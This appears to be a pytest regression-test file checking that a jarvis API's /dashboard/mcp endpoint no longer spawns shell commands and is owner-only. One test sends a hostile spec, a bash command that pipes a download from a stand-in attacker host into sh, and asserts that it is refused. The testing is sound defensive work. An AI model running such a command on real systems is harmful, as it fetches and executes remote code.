"""
Regression tests for the /dashboard/mcp remote-code-execution fix.

Before this fix, the endpoint accepted a bare command ("bash -c ...") from
*any* authenticated caller — including a Free-tier account created for free
through the bot — and spawned it as a subprocess of the API server via
StdioServerParameters. These tests prove both halves of the fix stay in
place: the command-spawning branch is gone entirely (nobody can use it, not
even the owner), and the endpoint itself is owner-only (a regular customer's
token is refused before the request body is even inspected).
"""

from __future__ import annotations

import pytest

pytest.importorskip("fastapi")

from fastapi.testclient import TestClient  # noqa: E402

from jarvis.api.app import create_app  # noqa: E402
from jarvis.config.settings import Settings  # noqa: E402
from jarvis.core.container import ServiceContainer  # noqa: E402
from jarvis.core.engine import JarvisEngine  # noqa: E402
from jarvis.llm.client import LLMClient  # noqa: E402
from tests.conftest import FakeProvider  # noqa: E402

ADMIN = {"X-Admin-Key": "admin-secret"}


def _app(**overrides):
    overrides.setdefault("api_key", "")
    settings = Settings(
        anthropic_api_key="k", log_file="", memory_enabled=False,
        integrations_enabled=False, goals_enabled=False, rate_limit_enabled=False,
        auth_enabled=True, auth_db_path=":memory:",
        auth_admin_key="admin-secret",
        owner_username="tony", owner_password="arcreactor123",
        **overrides,
    )
    engine = JarvisEngine(container=ServiceContainer(
        settings, llm_client=LLMClient(primary=FakeProvider())))
    return create_app(engine=engine, settings=settings)


def _token(client, username: str, password: str) -> str:
    r = client.post("/auth/login", json={"username": username, "password": password})
    assert r.status_code == 200, r.text
    return r.json()["token"]


def _customer(client) -> str:
    """A regular, non-owner account — created the same way anyone can."""
    r = client.post("/admin/accounts",
                    json={"username": "villain", "password": "goldfinger1"},
                    headers=ADMIN)
    assert r.status_code == 200, r.text
    return _token(client, "villain", "goldfinger1")


# -- the endpoint no longer spawns processes, for anyone --------------------


def test_owner_cannot_spawn_a_process_either():
    # Removing the branch has to hold even for the one caller who is allowed
    # through the role check — the fix is "this can never run a process",
    # not "only the owner may run a process".
    with TestClient(_app()) as client:
        token = _token(client, "tony", "arcreactor123")
        r = client.post("/dashboard/mcp", json={"spec": "echo pwned"},
                        headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 400
        assert "http" in r.json()["detail"].lower()


def test_shell_metacharacters_in_spec_do_not_matter_because_it_is_refused():
    with TestClient(_app()) as client:
        token = _token(client, "tony", "arcreactor123")
        r = client.post(
            "/dashboard/mcp",
            json={"spec": "bash -c \"curl attacker.example/x | sh\""},
            headers={"Authorization": f"Bearer {token}"},
        )
        assert r.status_code == 400


# -- the endpoint is owner-only ----------------------------------------------


def test_regular_customer_is_refused_before_anything_runs():
    with TestClient(_app()) as client:
        token = _customer(client)
        r = client.post("/dashboard/mcp", json={"spec": "https://example.com/mcp"},
                        headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 403


def test_no_token_at_all_is_401_not_403():
    # Missing credentials and wrong-role credentials are different failures;
    # a client needs to tell "sign in" from "you signed in but may not do this".
    with TestClient(_app()) as client:
        r = client.post("/dashboard/mcp", json={"spec": "https://example.com/mcp"})
        assert r.status_code == 401


def test_shared_api_key_counts_as_the_owner():
    # The shared API_KEY is a single secret only the operator holds — same
    # trust level as the owner account, not a third identity to special-case.
    with TestClient(_app(api_key="ops-secret")) as client:
        r = client.post("/dashboard/mcp", json={"spec": "not-a-url"},
                        headers={"X-Api-Key": "ops-secret"})
        # Refused for being a non-URL spec, not for lacking permission —
        # proves the shared key passed the role check and reached validation.
        assert r.status_code == 400


def test_owner_may_still_connect_a_real_sse_server(monkeypatch):
    # The legitimate feature — connecting an external MCP tool server over
    # SSE — must keep working for the one caller who is allowed to use it.
    import jarvis.api.app as app_module

    class _FakeSession:
        async def list_tools(self):
            return []

    async def _fake_factory(cfg):
        assert cfg.transport == "sse"
        assert cfg.url == "https://tools.example.com/mcp"
        return _FakeSession()

    monkeypatch.setattr(
        "jarvis.mcp.manager._default_session_factory", _fake_factory)

    with TestClient(_app()) as client:
        token = _token(client, "tony", "arcreactor123")
        r = client.post("/dashboard/mcp",
                        json={"spec": "https://tools.example.com/mcp"},
                        headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 200, r.text
        assert r.json()["connected"] is True
